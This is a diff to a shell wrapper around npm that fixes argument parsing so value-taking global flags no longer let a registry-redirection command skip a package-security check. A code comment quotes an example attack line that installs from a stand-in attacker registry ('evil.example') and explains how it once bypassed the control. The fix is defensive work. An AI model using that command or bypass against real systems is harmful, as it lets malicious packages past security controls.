@@ -35,9 +35,32 @@ fi
 
 # Find the first non-flag argument — that's the npm subcommand. Bare `npm`,
 # `npm --version`, `npm -v` etc. leave subcmd empty.
+#
+# Value-taking global flags must have their VALUE skipped, or the scan lands
+# on the value and treats it as the subcommand. MEASURED (ECH-197): before
+# this loop skipped values, `npm --registry https://evil.example install pkg`
+# set subcmd to the URL, missed the case below, and exec'd the real npm with
+# sfw skipped — i.e. the registry-redirection shape (arXiv:2607.15143 R5/R6)
+# defeated the one control aimed at it, silently and fail-open. Same defect
+# the cargo wrapper already handles at templates/cargo-wrapper.sh.j2.
+#
+# `--flag=value` needs no entry here: it is a single token starting with `-`,
+# so the `-*` branch already skips it. Only separate-word values matter.
+#
+# This raises the floor; it is not a boundary. npm's global flag set is open
+# and will drift, and a value-taking flag missing from this list still fails
+# open exactly as before — no worse than the pre-fix behaviour, and the
+# subcommand `case` below stays the thing that decides.
 subcmd=""
+skip_value=0
 for arg in "$@"; do
+  if [ "$skip_value" = "1" ]; then skip_value=0; continue; fi
   case "$arg" in
+    --registry|--prefix|-C|--cache|--loglevel|--userconfig|--globalconfig|\
+    --workspace|-w|--omit|--include|--before|--node-options|--script-shell|\
+    --depth|--tag|--otp|--auth-type|--ca|--cafile|--cert|--key|\
+    --proxy|--https-proxy|--noproxy)
+      skip_value=1 ;;
     -*) ;;
     *) subcmd="$arg"; break ;;
   esac
